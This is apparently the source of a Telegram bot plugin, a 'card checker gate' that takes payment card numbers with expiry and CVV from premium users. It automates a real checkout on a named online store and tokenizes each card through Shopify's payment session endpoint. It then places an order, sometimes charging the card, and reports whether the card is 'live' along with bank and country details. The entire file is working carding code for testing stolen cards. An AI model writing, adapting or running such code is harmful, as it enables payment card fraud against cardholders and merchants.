from pyrogram import Client, filters
from pyrogram.types import Message
import requests
from plugins.defs1 import buscarEnT, bininfo
from urllib.parse import urlparse
import time
from plugins.sql.gates import buscarT
import random
from faker import Faker
from luhn import verify
from plugins.clases.usuarios import usuario
gate = "Shopify+Braintree"
emojis1 = ["š", "š¦", "š", "šø", "š§"]
emojis2 = ["š ", "ā", "ā", "š"]
rnd_emoji1 = random.choice(emojis1)
rnd_emoji2 = random.choice(emojis2)
r = requests.Session()
@Client.on_message(filters.command(["bn"], prefixes=["/", "."]))
async def premium(_, m: Message):
    Status = buscarT("bn")
    try:
        Estado = Status[2]
    except Exception: return await m.reply('<b>Error al encontrar el Gate</b>')
    if Estado == 'off': return await m.reply(f'š¬ššš ššššššš šššš ššššššššššš ššššššššššššš\nš¹šššĢš: <i>{Status[3]}</i>')
    start_time = time.time()
    user = m.from_user.username
    id = m.from_user.id
    user = usuario(nombre=user, id=id)
    rango = user.buscar()
    if not rango or rango == False: return await m.reply('<b>Usuario no registrado porfavor registrese</b>')
    if rango[2] == 'Free':
        return await m.reply('<b>Necesita ser Premium para utilizar este gate</b>')
    rangoC = rango[5]
    if rangoC == None:
        rangoC = rango[2]
    mensaje = m.text+"."
    mensaje = mensaje.replace("/", "|")
    mensaje = mensaje.replace(":", "|")
    
    try:
        cc = buscarEnT(mensaje, "bn ", "|")
        mes = buscarEnT(mensaje, cc+"|", "|")
        ano = buscarEnT(mensaje, mes+"|", "|")
        cvv = buscarEnT(mensaje, ano+"|", ".")
        veri = verify(cc)
        if not cc or not mes or not ano or not cvv: return await m.reply('<b>Formato invalido</b>')
        if veri == False: return await m.reply("<b>Algoritmo Luhn invalido ā</b>")
    except Exception:
        return await m.reply("<b>Formato invalido\nCC|MES|AĆO|CVV</b>")
    respuesta = await m.reply(f"""<b>Checkeando CC | ā³</b>""")
    fake = Faker()
    email = fake.ascii_free_email()
    product_link = "https://bombas.com/products/the-no-show-laundry-bag?variant=white-medium&size=os"
    a= r.get(product_link)
 
    varient_id = buscarEnT(a.text, 'variantId":',',')
    
    if not a or not varient_id: return await m.reply("error 1")

    b_data = {
'form_type': 'product',
'utf8': 'ā',
'id': varient_id,
'quantity': '1',
}
    b_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }
    
    webname = urlparse(product_link).netloc
    b = r.post(f'https://{webname}/cart/add', headers =b_head,data =b_data)
    status = b.status_code

    if not b: return await m.reply(status)

    d_data = {
'updates[]': '1',
'checkout': 'Check Out'
}
    d_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }

    d = r.post(f'https://{webname}/cart', headers=d_head, data=d_data)
    auth_token = buscarEnT(d.text, 'type="hidden" name="authenticity_token" value="','"')
    if not d:
      return await m.reply('Error requests')
    elif not auth_token:
        return await m.reply(f"""
auth token = {auth_token}
url: {d.url}
""")    

    checkout_url = d.url
    #return await m.reply(f"""
#variant_id = {varient_id}
#auth_token = {auth_token}
#checkout_url = {checkout_url}
#    """)
    taken1 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 20% | {rnd_emoji1}\nTiempo: {taken1:0.3}</b>")

    t1_data = {"_method": "patch","authenticity_token": auth_token,
	"previous_step": "contact_information","step": "shipping_method",
	"checkout[email]": email,"checkout[buyer_accepts_marketing]": ["0","1"],
	"checkout[shipping_address][first_name]": ["","jose"],
	"checkout[shipping_address][last_name]": ["","quiroz"],
	"checkout[shipping_address][address1]": ["","157+Allen+Street"],
	"checkout[shipping_address][address2]": ["",""],
	"checkout[shipping_address][city]": ["","New+York"],
	"checkout[shipping_address][country]": ["","United States"],
	"checkout[shipping_address][province]": ["","NY"],
    "checkout[shipping_address][zip]": ["","10002"],
	"checkout[shipping_address][phone]": ["","(717)+123-1234"],
	"checkout[buyer_accepts_sms]": "0",
	"checkout[sms_marketing_phone]": "",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "162",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180",
	"button": ""
}
    t1 = r.post(checkout_url, data=t1_data)
    if not t1 or not "step=shipping_method" in t1.url: 
        print(t1.text)
        return await m.reply('Error: envio')
    taken2 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 40% | {rnd_emoji2}\nTiempo: {taken2:0.3}</b>")
    t_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "shipping_method",
	"step": "payment_method",
	"checkout[shipping_rate][id]": r"shopify-Standard%20Shipping%20(allow%205-8%20business%20days%20for%20delivery)-5.95",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "233",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180",
	"button": ""
}
    t = r.post(checkout_url, data=t_data)
    if not t: return await m.reply('Error delivery')
    payment_gateway = buscarEnT(t.text,'data-subfields-for-gateway="','"')
    if not payment_gateway:
        t2 = r.get(checkout_url+"?previous_step=shipping_method&step=payment_method")
        payment_gateway = buscarEnT(t2.text,'data-subfields-for-gateway="','"')
        if not payment_gateway:
            print(t2.text)
            return await m.reply('Error de siempre')
    nombre = str(fake.name())

    json_four = {"credit_card": {"month": mes,"name": nombre,"number": cc,"verification_value": cvv,"year": ano},"payment_session_scope": webname}

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    
    if "id" not in four.json(): return await m.reply('Error al checkear')
    id = four.json()["id"] 
    taken3 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 85% | {rnd_emoji2}\nTiempo: {taken3:0.3}</b>")
    #await m.reply(auth_token)
    #await m.reply(id)
    #await m.reply(gateway)

    dic = {
	"_method": "patch","authenticity_token": auth_token,
	"previous_step": "payment_method","step": "","s": id,
	"checkout[payment_gateway]": payment_gateway,
	"checkout[credit_card][vault]": "false",
	"checkout[different_billing_address]": "false",
	"checkout[remember_me]": ["false","0"],
	"checkout[vault_phone]": "+17171231234",
	"checkout[total_price]": "1095","complete": "1",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "203",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"}

    f = r.post(checkout_url, data = dic)
    response_r1 = buscarEnT(f.text, 'class="notice__text">', "<")
    if not f or 'processing' not in f.url and response_r1 == None: return await m.reply('Error al checkear')
    time.sleep(4)
    g = r.get(checkout_url + '/processing?from_processing_page=1')
    time.sleep(6)
    charge_Link=None
    if 'Thank you' in g.text or 'Thank You For Your Order' in g.text or 'Your order is confirmed' in g.text: charge_Link = "Charged"
    if not charge_Link:
        if not g or 'from_processing_page=1&validate=true' not in g.url: print(g.text); return await m.reply('Error al checkear')
    complete = f"{cc}|{mes}|{ano}|{cvv}"
    getBin =  bininfo(cc)
    if "Error" in getBin: return await respuesta.edit('<b>Error al obtener la informacion del bin</b>')
    binP, vendor, tipo, level, bank, codeCountry, country, emojiCountry = getBin
    response_error = buscarEnT(g.text, 'class="notice__text">', "<")
    r_logo, r_message, r_res = "ā", 'Declined', response_error
    if charge_Link != None: r_logo, r_message, r_res = "ā", "Approved", "CHARGED $11" 
    if "2010" in response_error: r_logo, r_message, r_res = "ā", "CCN Live", response_error
    if "2001" in response_error: r_logo, r_message, r_res = "ā", "Approved", response_error
    if response_r1 != None: response_error = response_r1
    taken4 = int(time.time()) - start_time
    nombre = m.from_user.first_name
    if nombre == None: nombre = ""
    apellido = m.from_user.last_name
    if apellido == None: apellido = ""
    await respuesta.edit(f"""ššš«š: <code><i>{complete}</i></code>\nšš­šš­š®š¬: <i>{r_message} {r_logo}</i>\nššš¬š©šØš§š¬š: <i>{r_res}</i>\nššš­š: <i>{gate}</i>\n<b>------> ššš­šš¢š„š¬ <------</b>\nšš¢š§: <code><i>{binP}</i></code>\nšš¢š§ š¢š§ššØ: <code><i>{vendor} - {tipo} - {level}</i></code>\nššš§š¤: <code><i>{bank}</i></code>\nššØš®š§š­š«š²: {emojiCountry} <code><i>{country} - {codeCountry}</i></code>\n<b>------> šš§ššØ <------</b>\nšš¢š¦š: {taken4:0.3} ššš š¬\nšš”ššš¤šš šš²:  <a href="tg://user?id={m.from_user.id}">{nombre} {apellido}</a> [{rangoC}]\nšš°š§šš«: <code><i>šš«šš±š±ššš</i></code>""")
    
